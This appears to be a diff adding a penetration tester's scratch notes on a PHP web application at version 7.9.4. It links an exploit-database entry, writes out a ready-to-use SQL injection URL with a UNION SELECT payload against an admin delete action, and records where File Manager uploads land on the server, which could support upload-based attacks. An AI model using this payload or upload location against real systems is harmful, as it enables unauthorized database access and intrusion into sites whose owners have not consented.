@@ -1,0 +1,6 @@
+Versions 7.9.4
+https://www.nmmapper.com/st/exploitdetails/27771/30421/
+SQL injection: http://IP:PORT/php/index.php?tg=admoc&idx=octypes&action=delete_type&item=a%27%20UNION%20SELECT%20user()%3B--%20
+------
+Files uploaded via File Manager stored roughly at /upload/fileManager/collectives/DG0/FOLDERNAME/FILENAME
+  If errors appear when creating file, check site file upload config as it may be invalid for some reason.
